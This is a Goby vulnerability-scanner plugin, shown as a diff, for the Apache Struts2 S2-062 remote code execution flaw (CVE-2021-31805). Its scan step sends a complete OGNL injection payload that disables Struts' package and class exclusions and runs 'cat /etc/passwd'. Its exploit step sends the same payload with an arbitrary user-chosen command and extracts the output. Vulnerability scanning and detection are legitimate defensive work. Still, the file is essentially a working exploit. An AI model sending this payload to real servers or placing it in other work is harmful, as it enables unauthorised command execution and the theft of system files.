@@ -1,0 +1,110 @@
+{
+      "Name": "Apache Struts2 S2-062 RCE CVE-2021-31805",
+      "Level": "3",
+      "Tags": [
+            "rce"
+      ],
+      "GobyQuery": "app=\"struts2\" || app=\"java\" || app=\"jsp\" || product=\"JAVA\" || product=\"JSP\"",
+      "Description": "Struts2 is a popular and mature web application framework based on the MVC design pattern.",
+      "Product": "Struts2",
+      "Homepage": "https://struts.apache.org/",
+      "Author": "",
+      "Impact": "The fix issued for CVE-2020-17530 was incomplete. So from Apache Struts 2.0.0 to 2.5.29, still some of the tag’s attributes could perform a double evaluation if a developer applied forced OGNL evaluation by using the %{...} syntax. Using forced OGNL evaluation on untrusted user input can lead to a Remote Code Execution and security degradation.",
+      "Recommendation": "https://cwiki.apache.org/confluence/display/WW/S2-062",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-31805",
+            "https://cwiki.apache.org/confluence/display/WW/S2-062"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Command",
+                  "Type": "input",
+                  "Value": "whoami"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0).(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0).(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0).(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root:x:",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "daemon:x:",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"
+                        },
+                        "data_type": "text",
+                        "data": "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0).(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0).(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0).(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'{{{Command}}}'}))}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|id=\"([^<]+)\"\\s"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
